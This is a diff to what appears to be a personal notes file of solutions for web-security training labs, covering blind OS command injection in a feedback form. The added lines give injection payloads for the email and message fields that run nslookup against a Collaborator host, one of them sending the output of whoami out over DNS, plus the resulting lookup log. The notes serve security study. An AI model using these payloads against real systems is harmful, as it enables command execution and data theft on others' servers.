@@ -47,7 +47,28 @@ GET /image?filename=whoami.txt
 ```
 
 #### Blind OS command injection with out-of-band interaction
-TODO
+- scan **POST /feedback/submit**
+- find that message, email and subject fields have OAST interactions:
+```
+email=e@e|nslookup+-q=cname+COLLAB.oastify.com%26
+```
+or
+```
+message=test&nslookup ...oastify.com.&'\"`0&nslookup ...oastify.com.&`'
+```
+- don't use q=cname >_<
+
+or
+```
+email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
+```
 
 #### Blind OS command injection with out-of-band data exfiltration
-TODO
+- scan **POST /feedback/submit**
+- find that message, email and subject fields have OAST interactions:
+```
+email=test%40t||nslookup+$(whoami).COLLAB.oastify.com||
+...
+
+The Collaborator server received a DNS lookup of type A for the domain name peter-GOnvHP.COLLAB.oastify.com.
+```
